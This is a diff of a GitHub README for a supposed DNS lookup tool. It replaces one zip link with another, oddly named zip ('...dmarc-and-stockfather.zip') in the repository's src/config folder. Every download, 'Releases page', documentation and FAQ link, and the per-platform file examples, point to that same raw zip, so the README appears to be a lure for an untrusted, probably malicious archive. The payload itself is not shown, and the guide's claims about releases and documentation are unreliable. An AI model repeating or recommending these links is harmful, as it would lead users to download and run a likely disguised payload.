@@ -4,7 +4,7 @@
 Welcome! This guide will help you download and run the DNS lookup tool efficiently. You can use this tool to examine various DNS records including A, MX, TXT, and PTR. 
 
 ## 📥 Download Link
-[![Download](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip)
+[![Download](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip)
 
 ## 📋 What You Need
 - A computer running Windows, macOS, or Linux.
@@ -20,13 +20,13 @@ Welcome! This guide will help you download and run the DNS lookup tool efficient
 
 ## 🌍 How to Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip) to access the latest version of the tool.
+   Go to the [Releases page](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip) to access the latest version of the tool.
 
 2. **Download the Latest Version:**
    Look for the most recent release. You will see a list of files under "Assets". Choose the appropriate file for your operating system:
-   - For **Windows**, select the executable file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip`).
-   - For **macOS**, select the `.dmg` file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip`).
-   - For **Linux**, grab the `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip` file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip`).
+   - For **Windows**, select the executable file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip`).
+   - For **macOS**, select the `.dmg` file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip`).
+   - For **Linux**, grab the `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip` file (e.g., `https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip`).
 
 3. **Save the File:**
    Click on the file to start the download. Save it to a location on your computer where you can easily find it, such as your desktop or downloads folder.
@@ -54,13 +54,13 @@ Welcome! This guide will help you download and run the DNS lookup tool efficient
 
 ## 📅 Additional Resources
 - **User Manual:** A detailed user manual is provided in your application folder. Please read through it for specific instructions and troubleshooting.
-- **FAQs:** Your questions might have answers in the FAQs section of our [documentation](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip).
+- **FAQs:** Your questions might have answers in the FAQs section of our [documentation](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip).
 
 ## 🤝 Support
 If you encounter issues, consider reaching out through the Issues tab on GitHub. Your feedback and experiences will help improve the tool.
 
 ## 🔗 Important Links
-- [Releases Page](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip)
-- [Documentation](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr_v3.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip)
+- [Documentation](https://raw.githubusercontent.com/Chaeyoung06/dns-lookup-forward-and-reverse-a-mx-txt-dmarc-ptr/main/src/config/txt-reverse-a-forward-dns-ptr-mx-lookup-dmarc-and-stockfather.zip)
 
 Thank you for using the dns-lookup tool! Your efforts in understanding DNS records enhance your internet security and network auditing skills.
